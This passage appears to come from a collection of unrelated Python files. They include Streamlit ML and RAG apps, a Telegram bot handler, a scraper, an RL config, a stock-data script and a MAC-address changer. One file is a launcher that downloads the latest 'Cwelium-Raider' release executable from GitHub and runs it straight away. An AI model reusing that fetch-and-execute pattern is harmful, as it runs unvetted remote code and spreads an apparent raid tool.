col1:\r\n        trestbps = st.text_input('Resting Blood Pressure')\r\n        \r\n    with col2:\r\n        chol = st.text_input('Serum Cholestoral in mg/dl')\r\n        \r\n    with col3:\r\n        fbs = st.text_input('Fasting Blood Sugar > 120 mg/dl')\r\n        \r\n    with col1:\r\n        restecg = st.text_input('Resting Electrocardiographic results')\r\n        \r\n    with col2:\r\n        thalach = st.text_input('Maximum Heart Rate achieved')\r\n        \r\n    with col3:\r\n        exang = st.text_input('Exercise Induced Angina')\r\n        \r\n    with col1:\r\n        oldpeak = st.text_input('ST depression induced by exercise')\r\n        \r\n    with col2:\r\n        slope = st.text_input('Slope of the peak exercise ST segment')\r\n        \r\n    with col3:\r\n        ca = st.text_input('Major vessels colored by flourosopy')\r\n        \r\n    with col1:\r\n        thal = st.text_input('thal: 0 = normal; 1 = fixed defect; 2 = reversable defect')\r\n        \r\n        \r\n     \r\n     \r\n    # code for Prediction\r\n    heart_diagnosis = ''\r\n    \r\n    # creating a button for Prediction\r\n    \r\n    if st.button('Heart Disease Test Result'):\r\n        heart_prediction = heart_disease_model.predict([[age, sex, cp, trestbps, chol, fbs, restecg,thalach,exang,oldpeak,slope,ca,thal]])                          \r\n        \r\n        if (heart_prediction[0] == 1):\r\n          heart_diagnosis = 'The person is having heart disease'\r\n        else:\r\n          heart_diagnosis = 'The person does not have any heart disease'\r\n        \r\n    st.success(heart_diagnosis)\r\n        \r\n    \r\n    \r\n\r\n# Parkinson's Prediction Page\r\nif (selected == \"Parkinsons Prediction\"):\r\n    \r\n    # page title\r\n    st.title(\"Parkinson's Disease Prediction using ML\")\r\n    \r\n    col1, col2, col3, col4, col5 = st.columns(5)  \r\n    \r\n    with col1:\r\n        fo = st.text_input('MDVP:Fo(Hz)')\r\n        \r\n    with col2:\r\n        fhi = st.text_input('MDVP:Fhi(Hz)')\r\n        \r\n    with col3:\r\n        flo = st.text_input('MDVP:Flo(Hz)')\r\n        \r\n    with col4:\r\n        Jitter_percent = st.text_input('MDVP:Jitter(%)')\r\n        \r\n    with col5:\r\n        Jitt",
    "import subprocess\r\nimport optparse\r\nimport re\r\n\r\ndef get_user_inputs():\r\n    parse_object = optparse.OptionParser()\r\n    parse_object.add_option(\"-i\",\"--interface\", dest=\"interface\", help=\"Change interface!!\")\r\n    parse_object.add_option(\"-m\",\"--mac\", dest=\"new_mac\", help=\"New mac address\")\r\n    return parse_object.parse_args()\r\n\r\ndef change_mac_address(interface, new_mac):\r\n    subprocess.call([\"ifconfig\",interface,\"down\"])\r\n    subprocess.call([\"ifconfig\",interface,\"hw\",\"ether\",new_mac])\r\n    subprocess.call([\"ifconfig\",interface,\"up\"])\r\n\r\ndef follow_new_mac(interface):\r\n    ifconfig = subprocess.check_output([\"ifconfig\", interface])\r\n    mac = re.search(r\"\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w:\\w\\w\", str(ifconfig))\r\n    if mac:\r\n        return mac.group(0)\r\n    else:\r\n        return 0\r\n\r\nprint(\"\"\"\r\nW     W   EEEEE   L       CCCCC    OOO    M   M   EEEEE  \r\nW  W  W   E       L       C       O   O   MM MM   E      \r\nW W W W   EEEE    L       C       O   O   M M M   EEEE   \r\nW     W   E       L       C       O   O   M   M   E      \r\nW     W   EEEEE   LLLLL   CCCCC    OOO    M   M   EEEEE\r\n\r\n\"\"\")\r\nprint(\"macChanger starting...\")\r\n(user_inputs, arguments) = get_user_inputs()\r\nold_address = follow_new_mac(str(user_inputs.interface))\r\nchange_mac_address(user_inputs.interface, user_inputs.new_mac)\r\nfinal_address = follow_new_mac(str(user_inputs.interface))\r\nif final_address == user_inputs.new_mac and final_address != old_address:\r\n    print(\"\\nCongratulations. MAC address has been changed\")\r\n    print(\"\\nOld mac adress: \", old_address)\r\n    print(\"New mac adress: \", final_address)\r\nelse:\r\n    print(\"ERROR. Something wrong!\")    ",
    "#(\u00a9)Codexbotz\n\nfrom pyrogram import __version__\nfrom bot import Bot\nfrom config import OWNER_ID\nfrom pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery\n\n@Bot.on_callback_query()\nasync def cb_handler(client: Bot, query: CallbackQuery):\n    data = query.data\n    if data == \"about\":\n        await query.message.edit_text(\n            text = f\"<b>\u25cb \u1d0f\u1d21\u0274\u1d07\u0280 : <a href='tg://user?id={OWNER_ID}'>owner</a>\\n\u25cb \u1d0d\u028f \u1d1c\u1d18\u1d05\u1d00\u1d1b\u1d07s : <a href='https://t.me/ultroid_official'> \u0299\u1d0f\u1d1bs</a>\\n\u25cb \u1d0d\u1d0f\u1d20\u026a\u1d07s \u1d1c\u1d18\u1d05\u1d00\u1d1b\u1d07s : <a href='https://t.me/MovizTube'>MovizTube</a>\\n\u25cb \u1d0f\u1d1c\u0280 \u1d04\u1d0f\u1d0d\u1d0d\u1d1c\u0274\u026a\u1d1b\u028f : <a href='https://t.me/ultroidofficial_chat'>\u1d0f \u0274\u1d07\u1d1b\u1d21\u1d0f\u0280\u1d0b</a>\\n\u25cb \u1d04\u029c\u1d00\u1d1b : <a href='https://t.me/MovizTube_Group'>\u1d22\u1d0f\u0274\u1d07</a></b>\",\n            disable_web_page_preview = True,\n            reply_markup = InlineKeyboardMarkup(\n                [\n                    [\n                    InlineKeyboardButton(\"\u26a1\ufe0f \u1d04\u029f\u1d0fs\u1d07\", callback_data = \"close\"),\n                    InlineKeyboardButton('\ud83c\udf41 Youtube', url='https://youtube.com/@ultroidofficial')\n                    ]\n                ]\n            )\n        )\n    elif data == \"close\":\n        await query.message.delete()\n        try:\n            await query.message.reply_to_message.delete()\n        except:\n            pass\n",
    "import pygame\r\nimport numpy as np\r\nfrom settings import *\r\n\r\n\r\nclass Ray:\r\n    def __init__(self, pos, angle):\r\n        self.angle = angle\r\n        self.start_pos = pos\r\n        self.finish_pos = pygame.Vector2()\r\n        self.dir = pygame.Vector2(np.cos(angle), np.sin(angle))\r\n\r\n    def cast(self, wall):\r\n        x1 = wall.a.x\r\n        y1 = wall.a.y\r\n        x2 = wall.b.x\r\n        y2 = wall.b.y\r\n        x3 = self.start_pos.x\r\n        y3 = self.start_pos.y\r\n        x4 = self.start_pos.x+self.dir.x\r\n        y4 = self.start_pos.y+self.dir.y\r\n        den = (x1-x2)*(y3-y4)-(y1-y2)*(x3-x4)\r\n        if den == 0:\r\n            return None\r\n        t = ((x1-x3)*(y3-y4)-(y1-y3)*(x3-x4))/den\r\n        u = - ((x1-x2)*(y1-y3)-(y1-y2)*(x1-x3))/den\r\n        if 0 <= t <= 1 and 0 <= u:\r\n            self.finish_pos = pygame.Vector2()\r\n            self.finish_pos.x = x1 + t * (x2 - x1)\r\n            self.finish_pos.y = y1 + t * (y2 - y1)\r\n            return self.finish_pos\r\n        else:\r\n            return None\r\n",
    "import json\nimport random\n\n# random.seed(0)\n\ngqa_file = json.load(open(\"llava_v1_5_mix665k_gqa.json\", \"r\"))\n\n\n\nmessage = []\n\nfor item in gqa_file:\n    conversation = item['conversations']\n\n    info = {'text': []}\n    info['image'] = item['image'].split('/')[-1]\n\n    text_list = []\n\n    for question in conversation:\n        if question['from'] == 'gpt':\n            continue\n        text_list.append(question['value'].replace('<image>', '').replace('Answer the question using a single word or phrase.', '').replace('\\n', ''))\n\n    info['text'] = random.sample(text_list, min(len(text_list), 2))\n    \n\n\n    message.append(info)\n\n\n\nsample_item = 4\nsel_messge = random.sample(message, sample_item * 1000)\n\nprint(\"obtaining {}k gqa image_question pairs\".format(sample_item * 2)) # each sample item has 2 instances\nprint(\"saving as ./gqa_image_question_list_{}k.json\".format(sample_item * 2))\n\n\nf = open(\"gqa_image_question_list_{}k.json\".format(sample_item * 2), \"w\")\n\nfor info in sel_messge:\n\n    for i in range(len(info['text'])):\n\n        sel_info = {}\n        sel_info['image'] = info['image']\n        sel_info['text'] = info['text'][i]\n    \n        sel_info = json.dumps(sel_info)\n\n        f.writelines(sel_info + \"\\n\")\n\n\n\n    \n",
    "import requests\nimport colorama \nimport os\n\nos.system(f\"title Cwelium Downloader\")\n\nstars = requests.get(f\"https://api.github.com/repos/Tips-white/Cwelium-Raider\").json()[\"stargazers_count\"]\n\nmenu = f\"\"\"\n{'\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557    \u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2557      \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 '.center(os.get_terminal_size().columns)}\n{'\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557'.center(os.get_terminal_size().columns)}\n{'\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d'.center(os.get_terminal_size().columns)}\n{'\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557'.center(os.get_terminal_size().columns)}\n{'\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551'.center(os.get_terminal_size().columns)}\n{'\u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d'.center(os.get_terminal_size().columns)}\n{f'Stars {stars}'.center(os.get_terminal_size().columns)}\"\"\"\n\ndef download_latest_release():\n    api_url = f\"https://api.github.com/repos/Tips-white/Cwelium-Raider/releases/latest\"\n    \n    try:\n        response = requests.get(api_url)\n        response.raise_for_status()\n        release_info = response.json()\n        asset_url = release_info['assets'][0]['browser_download_url']\n\n        response = requests.get(asset_url)\n        response.raise_for_status()\n\n        with open(f\"Cwelium.exe\", \"wb\") as file:\n            file.write(response.content)\n        \n    except requests.exceptions.RequestException as e:\n        print(f\"Error: {e}\")\n\n\nif __name__ == \"__main__\":\n    print(menu)\n    download_latest_release()\n    os.system(\"start Cwelium.exe\")\n",
    "# Author: Zhu Wenye\r\n# time:2024-4-17\r\n# version:1.0\r\n#\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nimport pandas as pd\r\nimport cv2\r\nimport numpy as np\r\nimport urllib.request\r\n\r\n\r\n# Author: Zhu Wenye\r\n# time:2024-4-17\r\n# version:1.0\r\n#\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nimport pandas as pd\r\n\r\n\r\ndef getcollection(url, headers):\r\n\r\n    collections = [] #\u6240\u6709\u4fe1\u606f\u5bb9\u5668\r\n\r\n    for i in range(4000,11711):  #1624\u4e0d\u5b58\u5728\u7f51\u9875\uff0c\u5b9e\u9645\u8fd0\u884c\u65f6\u5e94\u5206\u5f00\u904d\u53860-1623\u548c1625-11710\r\n        print(i)\r\n        url_new = url + str(i) + \".html\"  #\u7f51\u5740\r\n        response = requests.get(url_new, headers=headers)\r\n        soup = BeautifulSoup(response.content, 'html.parser')\r\n\r\n        #\u53bb\u9664\u4e0d\u76f8\u5173\u7f51\u5740\r\n        if (soup.find('div', class_=\"pad\") is None\r\n                or (len(soup.find('div', class_=\"pad\").find_all('div', class_=\"li\") )!=4\r\n                and len(soup.find('div', class_=\"pad\").find_all('div', class_=\"li\") )!=5)):\r\n            continue\r\n\r\n        collection = [] #\u5355\u4e2a\u6587\u7269\u4fe1\u606f\u5bb9\u5668\r\n\r\n        # \u6587\u672c\u90e8\u5206\r\n        pad = soup.find('div', class_=\"pad\")\r\n        collection.append(pad.find('div', class_=\"t\").text.strip()) #\u540d\u5b57\r\n        collection.append(pad.find_all('div', class_=\"li\")[0].text.split('\uff1a')[1]) #\u65f6\u4ee3\r\n        collection.append(pad.find_all('div', class_=\"li\")[1].text.split('\uff1a')[1]) #\u7ea7\u522b\r\n\r\n        # \u5c55\u51fa\u7684\u4f1a\u591a\u4e24\u6761\u6587\u672c\r\n        num = len(pad.find_all('div', class_=\"li\"))\r\n        if num == 4:\r\n            collection.append(\"\")\r\n            collection.append(pad.find_all('div', class_=\"li\")[2].text.split('\uff1a')[1]) #\u5927\u5c0f\r\n            collection.append(pad.find_all('div', class_=\"li\")[3].text.split('\uff1a')[1]) #\u6750\u8d28\r\n            collection.append(\"\")\r\n\r\n\r\n        else:\r\n            collection.append(pad.find_all('div', class_=\"li\")[2].text.split('\uff1a')[1]) #\u51fa\u571f\u5730\u70b9\r\n            collection.append(pad.find_all('div', class_=\"li\")[3].text.split('\uff1a')[1]) #\u5927\u5c0f\r\n            collection.append(pad.find_all('div', class_=\"li\")[4].text.split('\uff1a')[1]) #\u6750\u8d28\r\n            dis = soup.find('div', class_=\"p\").string\r\n            collection.append(dis)  #\u6587\u672c\u63cf\u8ff0\r\n\r\n        # \u56fe\u7247\u90e8\u5206\r\n        pic = soup.find('div', class_='pic')\r\n        img_url = \"https://www.sxhm.com\" + pic.find('img').get('src')\r\n        collection.append(url_new) #\u6587\u7269\u8be6\u60c5\u9875\u7f51\u5740\r\n        collection.append(img_url) #\u56fe\u7247\u4e0b\u8f7d\u94fe\u63a5\r\n\r\n        collections.append(collection)\r\n\r\n    return collections\r\n\r\n\r\ndef collection_to_csv(collections):\r\n    df = pd.DataFrame(collections)\r\n    df.columns = ['name', 'time', 'leve', 'location(\u4ec5\u9547\u9986\u4e4b\u5b9d\u6709)', 'size', 'material', 'describe(\u4ec5\u9547\u9986\u4e4b\u5b9d\u6709)', 'relic_url', 'img_url']\r\n    df.to_csv(\"shanxi.csv\",index_label='id',encoding=\"utf_8_sig\")\r\n\r\n\r\nurl = \"https://www.sxhm.com/collections/detail/\"\r\nheaders = {\r\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0\"\r\n}\r\ncollections = getcollection(url, headers)\r\ncollection_to_csv(collections)\r\nprint(\"\u7ed3\u675f\")",
    "import argparse\nimport os\nimport numpy as np\n\nfrom gops.create_pkg.create_alg import create_alg\nfrom gops.create_pkg.create_buffer import create_buffer\nfrom gops.create_pkg.create_env import create_env\nfrom gops.create_pkg.create_evaluator import create_evaluator\nfrom gops.create_pkg.create_sampler import create_sampler\nfrom gops.create_pkg.create_trainer import create_trainer\nfrom gops.utils.init_args import init_args\nfrom gops.utils.plot_evaluation import plot_all\nfrom gops.utils.tensorboard_setup import start_tensorboard, save_tb_to_csv\n\n\nif __name__ == \"__main__\":\n    # Parameters Setup\n    parser = argparse.ArgumentParser()\n\n    ################################################\n    # Key Parameters for users\n    parser.add_argument(\n        \"--env_id\", type=str, default=\"gym_humanoid\", help=\"id of environment\"\n    )\n    parser.add_argument(\"--algorithm\", type=str, default=\"DSACT\", help=\"RL algorithm\")\n    parser.add_argument(\"--enable_cuda\", default=False, help=\"Enable CUDA\")\n    parser.add_argument(\"--seed\", default=12345, help=\"Global seed\")\n    ################################################\n    # 1. Parameters for environment\n    parser.add_argument(\n        \"--reward_scale\", type=float, default=0.2, help=\"reward scale factor\"\n    )\n    parser.add_argument(\n        \"--is_render\", type=bool, default=False, help=\"Draw environment animation\"\n    )\n    parser.add_argument(\n        \"--is_adversary\", type=bool, default=False, help=\"Adversary training\"\n    )\n\n    ################################################\n    # 2.1 Parameters of value approximate function\n    parser.add_argument(\n        \"--value_func_name\",\n        type=str,\n        default=\"ActionValueDistri\",\n        help=\"Options: StateValue/ActionValue/ActionValueDis/ActionValueDistri\",\n    )\n    parser.add_argument(\n        \"--value_func_type\",\n        type=str,\n        default=\"MLP\",\n        help=\"Options: MLP/CNN/CNN_SHARED/RNN/POLY/GAUSS\",\n    )\n    value_func_type = parser.parse_known_args()[0].value_func_type\n    parser.add_argument(\"--value_hidden_sizes\", type=list, default=[256, 256, 256])\n    parser.add_argument(\n        \"--value_hidden_activation\",\n        type=str,\n        default=\"gelu\",\n        help=\"Options: relu/gelu/elu/selu/sigmoid/tanh\",\n    )\n    parser.add_argument(\n        \"--value_output_activation\",\n        type=str,\n        default=\"linear\",\n        help=\"Options: linear/tanh\",\n    )\n\n    # 2.2 Parameters of policy approximate function\n    parser.add_argument(\n        \"--policy_func_name\",\n        type=str,\n        default=\"StochaPolicy\",\n        help=\"Options: None/DetermPolicy/FiniteHorizonPolicy/StochaPolicy\",\n    )\n    parser.add_argument(\n        \"--policy_func_type\",\n        type=str,\n        default=\"MLP\",\n        help=\"Options: MLP/CNN/CNN_SHARED/RNN/POLY/GAUSS\",\n    )\n    parser.add_argument(\n        \"--policy_act_distribution\",\n        type=str,\n        default=\"TanhGaussDistribution\",\n        help=\"Options: default/TanhGaussDistribution/GaussDistribution\",\n    )\n    policy_func_type = parser.parse_known_args()[0].policy_func_type\n    parser.add_argument(\"--policy_hidden_sizes\", type=list, default=[256, 256, 256])\n    parser.add_argument(\n        \"--policy_hidden_activation\",\n        type=str,\n        default=\"gelu\",\n        help=\"Options: relu/gelu/elu/selu/sigmoid/tanh\",\n    )\n    parser.add_argument(\"--policy_min_log_std\", type=int, default=-20)\n    parser.add_argument(\"--policy_max_log_std\", type=int, default=0.5)\n\n    ################################################\n    # 3. Parameters for RL algorithm\n    parser.add_argument(\"--value_learning_rate\", type=float, default=0.0001)\n    parser.add_argument(\"--policy_learning_rate\", type=float, default=0.0001)\n    parser.add_argument(\"--alpha_learning_rate\", type=float, default=0.0003)\n    # special parameter\n    parser.add_argument(\"--gamma\", type=float, default=0.99)\n    parser.add_argument(\"--tau\", type=float, default=0.005)\n    parser.add_argument(\"--auto_alpha\", type=bool, default=True)\n    parser.add_argument(\"--alpha\", type=float, default=0.2)\n    parser.add_argument(\"--delay_update\", type=int, default=2)\n\n    ################################################\n    # 4. Parameters for trainer\n    parser.add_argument(\n        \"--trainer\",\n        type=str,\n        default=\"off_serial_trainer\",\n        help=\"Options: on_serial_trainer, on_sync_trainer, off_serial_trainer, off_async_trainer\",\n    )\n    # Maximum iteration number\n    parser.add_argument(\"--max_iteration\", type=int, default=1000000)\n    parser.add_argument(\"--ini_network_dir\", type=str, default=None)\n    trainer_type = parser.parse_known_args()[0].trainer\n\n    # 4.1. Parameters for off_serial_trainer\n    parser.add_argument(\n        \"--buffer_name\",\n        type=str,\n        default=\"replay_buffer\",\n        help=\"Options:replay_buffer/prioritized_replay_buffer\",\n    )\n    # Size of collected samples before training\n    parser.add_argument(\"--buffer_warm_size\", type=int, default=10000)\n    # Max s",
    "import streamlit as st\nimport pandas as pd\nimport numpy as np\nfrom groq import Groq\nfrom pinecone import Pinecone\n\nfrom langchain_community.embeddings.sentence_transformer import SentenceTransformerEmbeddings\nfrom langchain_pinecone import PineconeVectorStore\n\n\ndef get_relevant_excerpts(user_question, docsearch):\n    \"\"\"\n    This function retrieves the most relevant excerpts from presidential speeches based on the user's question.\n\n    Parameters:\n    user_question (str): The question asked by the user.\n    docsearch (PineconeVectorStore): The Pinecone vector store containing the presidential speeches.\n\n    Returns:\n    str: A string containing the most relevant excerpts from presidential speeches.\n    \"\"\"\n\n    # Perform a similarity search on the Pinecone vector store using the user's question\n    relevent_docs = docsearch.similarity_search(user_question)\n\n    # Extract the page content from the top 3 most relevant documents and join them into a single string\n    relevant_excerpts = '\\n\\n------------------------------------------------------\\n\\n'.join([doc.page_content for doc in relevent_docs[:3]])\n\n    return relevant_excerpts\n\n\ndef presidential_speech_chat_completion(client, model, user_question, relevant_excerpts, additional_context):\n    \"\"\"\n    This function generates a response to the user's question using a pre-trained model.\n\n    Parameters:\n    client (Groq): The Groq client used to interact with the pre-trained model.\n    model (str): The name of the pre-trained model.\n    user_question (str): The question asked by the user.\n    relevant_excerpts (str): A string containing the most relevant excerpts from presidential speeches.\n    additional_context (str): Additional context provided by the user.\n\n    Returns:\n    str: A string containing the response to the user's question.\n    \"\"\"\n\n    # Define the system prompt\n    system_prompt = '''\n    You are a presidential historian. Given the user's question and relevant excerpts from \n    presidential speeches, answer the question by including direct quotes from presidential speeches. \n    When using a quote, site the speech that it was from (ignoring the chunk).\n    '''\n\n    # Add the additional context to the system prompt if it's not empty\n    if additional_context != '':\n        system_prompt += '''\\n\n        The user has provided this additional context:\n        {additional_context}\n        '''.format(additional_context=additional_context)\n\n    # Generate a response to the user's question using the pre-trained model\n    chat_completion = client.chat.completions.create(\n        messages = [\n            {\n                \"role\": \"system\",\n                \"content\":  system_prompt\n            },\n            {\n                \"role\": \"user\",\n                \"content\": \"User Question: \" + user_question + \"\\n\\nRelevant Speech Exerpt(s):\\n\\n\" + relevant_excerpts,\n            }\n        ],\n        model = model\n    )\n    \n    # Extract the response from the chat completion\n    response = chat_completion.choices[0].message.content\n\n    return response\n\n\ndef main():\n    \"\"\"\n    This is the main function that runs the application. It initializes the Groq client and the SentenceTransformer model,\n    gets user input from the Streamlit interface, retrieves relevant excerpts from presidential speeches based on the user's question,\n    generates a response to the user's question using a pre-trained model, and displays the response.\n    \"\"\"\n\n    embedding_function = SentenceTransformerEmbeddings(model_name=\"all-MiniLM-L6-v2\")\n    \n    # Initialize the Groq client\n    groq_api_key = st.secrets[\"GROQ_API_KEY\"]\n    pinecone_api_key=st.secrets[\"PINECONE_API_KEY\"]\n    pinecone_index_name = \"presidential-speeches\"\n    client = Groq(\n        api_key=groq_api_key\n    )\n\n    pc = Pinecone(api_key = pinecone_api_key)\n    docsearch = PineconeVectorStore(index_name=pinecone_index_name, embedding=embedding_function)\n\n    # Display the Groq logo\n    spacer, col = st.columns([5, 1])  \n    with col:  \n        st.image('groqcloud_darkmode.png')\n\n    # Display the title and introduction of the application\n    st.title(\"Presidential Speeches RAG\")\n    multiline_text = \"\"\"\n    Welcome! Ask questions about U.S. presidents, like \"What were George Washington's views on democracy?\" or \"What did Abraham Lincoln say about national unity?\". The app matches your question to relevant excerpts from presidential speeches and generates a response using a pre-trained model.\n    \"\"\"\n\n    st.markdown(multiline_text, unsafe_allow_html=True)\n\n    # Add customization options to the sidebar\n    st.sidebar.title('Customization')\n    additional_context = st.sidebar.text_input('Enter additional summarization context for the LLM here (i.e. write it in spanish):')\n    model = st.sidebar.selectbox(\n        'Choose a model',\n        ['mixtral-8x7b-32768', 'llama2-70b-4096', 'gemma-7b-it']\n    )\n\n    # Get the user's question\n    user_question = st.text_input(\"Ask a question about a US president:\")\n\n    if use",
    "from haystack.components.builders import PromptBuilder\nfrom haystack.components.embedders import SentenceTransformersTextEmbedder\nfrom haystack_integrations.document_stores.weaviate.document_store import WeaviateDocumentStore\nfrom haystack_integrations.components.retrievers.weaviate.embedding_retriever import WeaviateEmbeddingRetriever\nfrom haystack.components.embedders import SentenceTransformersDocumentEmbedder\nfrom haystack import Pipeline\n\nimport box\nimport yaml\n\nfrom llm.llm import setup_llm\nfrom llm.prompts import prompt_template\n\n\nwith open('config.yml', 'r', encoding='utf8') as ymlfile:\n    cfg = box.Box(yaml.safe_load(ymlfile))\n\n\ndef setup_prompt():\n    return PromptBuilder(template = prompt_template)\n\n\ndef setup_embedder(model_name):\n    return SentenceTransformersTextEmbedder(model = model_name)\n\n\ndef setup_retriever(doc_store):\n    return WeaviateEmbeddingRetriever(document_store=doc_store, top_k=3)\n\n\ndef setup_rag_pipeline():\n    document_store = WeaviateDocumentStore(url=cfg.WEAVIATE_URL)\n\n    prompt = setup_prompt()\n    llm = setup_llm(cfg.LLM_MODEL)\n    embedder = setup_embedder(cfg.EMBEDDINGS)\n    retriever = setup_retriever(document_store)\n\n    rag_pipeline = Pipeline()\n    rag_pipeline.add_component(\"embedder\", embedder)\n    rag_pipeline.add_component(\"retriever\", retriever)\n    rag_pipeline.add_component(\"prompt_builder\", prompt)\n    rag_pipeline.add_component(\"llm\", llm )\n\n    rag_pipeline.connect(\"embedder.embedding\", \"retriever.query_embedding\")\n    rag_pipeline.connect(\"retriever\", \"prompt_builder.documents\")\n    rag_pipeline.connect(\"prompt_builder\", \"llm\")\n\n    return rag_pipeline",
    "import pandas as pd\nimport json\nimport requests\nfrom datetime import datetime, timedelta\nimport multiprocessing\nfrom multiprocessing import Pool\n\n# You are provided a personal key when you sign up for Polygon (also free tier)\npolykey = \"PUT YOUR POLYGON KEY HERE\"\n\n# choose exchange XNYS for NYSE or XNAS for NASDAQ\nexchange = 'XNYS'\n\n# define start/end date to generate market monitor for\n# you need to load a minimum of 65 trading days\nstart_date = datetime(2023, 1, 1)  # April 1, 2024\nend_date = datetime(2024, 4, 12)   # April 10, 2024\n\ndef iterate_over_weekdays(start_date, end_date):\n    current_date = start_date\n    while current_date <= end_date:\n        if current_date.weekday() < 5:  # Monday = 0, Sunday = 6\n            yield current_date\n        current_date += timedelta(days=1)\n\ndef process_day(day):\n    print(f'Processing {day}')\n    url = f'https://api.polygon.io/v2/aggs/grouped/locale/us/market/stocks/{day.strftime(\"%Y-%m-%d\")}?adjusted=true&apiKey={polykey}'\n    response = requests.get(url)\n    response.raise_for_status()  # Raise an exception for HTTP errors\n    data = json.loads(response.text)\n    if not data or 'results' not in data:\n        return None\n    df = pd.json_normalize(data, record_path=['results'])\n    df = df[['T','v','o','h','l','c']]\n    df['Date'] = day\n    return df\n\ndef process_tickers():\n    print('Loading tickers from Polygon.. can take up to 30 seconds')\n    url = f'https://api.polygon.io/v3/reference/tickers?market=stocks&active=true&order=asc&apiKey={polykey}'\n    try:\n        response = requests.get(url)\n        response.raise_for_status()  # Raise an exception for HTTP errors\n        data = json.loads(response.text)\n        \n        if not data or 'results' not in data:\n            return pd.DataFrame()\n\n    except:\n        return pd.DataFrame()\n\n    df_list = []\n    while True:\n        try:\n            df = pd.json_normalize(data, record_path=['results'])\n            df = df[['ticker','type','primary_exchange']]\n        except:\n            return pd.DataFrame()\n        \n        df_list.append(df)\n\n        if 'next_url' in data:\n            next_url = data['next_url'] + '&apiKey=' + polykey\n            try:\n                response = requests.get(next_url)\n                response.raise_for_status()  # Raise an exception for HTTP errors\n                data = json.loads(response.text)\n            except:\n                break\n        else:\n            break\n    \n    if df_list:\n        df = pd.concat(df_list, axis=0, ignore_index=True)\n        return df\n    else:\n        return pd.DataFrame()\n    \ndef process_data(df_combined):\n    df_combined['dolvol'] = df_combined['c'] * df_combined['v']\n\n    df_combined = pd.merge(df_combined, df_tickers, left_on='T', right_on='ticker', how='inner')\n\n    df_combined['Date'] = pd.to_datetime(df_combined['Date'])\n\n    df_combined = df_combined.sort_values(['Date', 'T'], ascending=[True, True])\n\n    df_combined['PctChange'] = df_combined.groupby('T')['c'].pct_change()\n\n    df_temp = df_combined.groupby('T')['c'].rolling(20, 1).mean().to_frame('MA020').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['dolvol'].rolling(20, 1).mean().to_frame('dolvol020').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['v'].shift(1).to_frame('pv').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['c'].shift(20).to_frame('pc020').reset_index(0, drop=True)\n    df_combined = pd.concat([df_combined, df_temp], axis=1)\n\n    df_temp = df_combined.groupby('T')['l'].rolling(34, 